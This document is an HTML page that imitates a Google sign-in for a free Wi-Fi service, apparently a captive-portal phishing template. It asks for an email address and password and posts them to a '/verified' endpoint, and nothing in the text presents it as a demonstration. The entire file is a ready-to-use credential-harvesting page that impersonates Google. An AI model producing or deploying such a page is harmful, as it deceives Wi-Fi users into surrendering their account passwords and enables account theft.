<!DOCTYPE html>
<html>
<head>
  <title>Free Wifi - Google</title>
  <meta name="viewport" content="width=device-width, initial-scale=0.75">
  <link rel="icon" href="data:,">
  <link rel="stylesheet" type="text/css" href="google_style.css">
</head>
<body>
  <div class="container">
      <div class="box">
          <div class="heading"></div>
          <p><span style="font-size:25px">Log In</span><br><br>Continue to application <br><strong style="color:#1a73e8">Free Wifi 2.0</strong></p>
          <form class="login-form" action="/verified">
              <input id="authMethod" type="authMethod" name="authMethod" value="Google" hidden/>
              <div class="field">
                  <input id="username" type="name" name="username" placeholder="Email address" required/>
                  <label for="username">Email address</label>
              </div>
              <div class="field">
                  <input id="password" type="password" name="password" placeholder="Password" required/>
                  <label for="password">Password</label>
              </div>
              <button class="login-button" title="login">Continue</button>
              <p></p>
          </form>
      </div>
  </div>
</body>
</html>
